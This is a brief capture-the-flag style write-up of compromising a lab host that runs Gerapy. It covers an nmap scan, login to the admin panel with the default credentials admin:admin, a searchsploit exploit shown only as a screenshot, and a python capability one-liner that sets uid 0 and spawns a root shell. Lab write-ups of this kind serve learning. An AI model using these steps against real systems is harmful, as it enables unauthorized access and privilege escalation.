#Pwned! 
```IP
192.168.204.24
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.204.24 -vvv -p- -oN enum/full
```
The output being:
```
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBYESg2KmNLhFh1KJaN2UFCVAEv6MWr58pqp2fIpCSBEK2wDJ5ap2XVBVGLk9Po4eKBbqTo96yttfVUvXWXoN3M=
|   256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBdIs4PWZ8yY2OQ6Jlk84Ihd5+15Nb3l0qvpf1ls3wfa
8000/tcp open  http-alt syn-ack ttl 61 WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
| http-methods:
|_  Supported Methods: GET OPTIONS
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
```

## HTTP

Searching for WSGIServer/0.2 CPython/3.10.6

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug

page not found
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240924102006.png?raw=true)

/admin
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240924102203.png?raw=true)

admin:admin let us in

adding some clients and tokens

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240924102403.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240924102447.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240924102711.png?raw=true)

With this we can access the site

we could access it even with admin:admin

```
searchsploit gerapy
```
returns an exploit that works as follows:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240924115623.png?raw=true)

# PrivEsc

## Manual
## Automated

### Peass

linpeas into

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240924121413.png?raw=true)
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
```
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240924121037.png?raw=true)


### Mimikatz


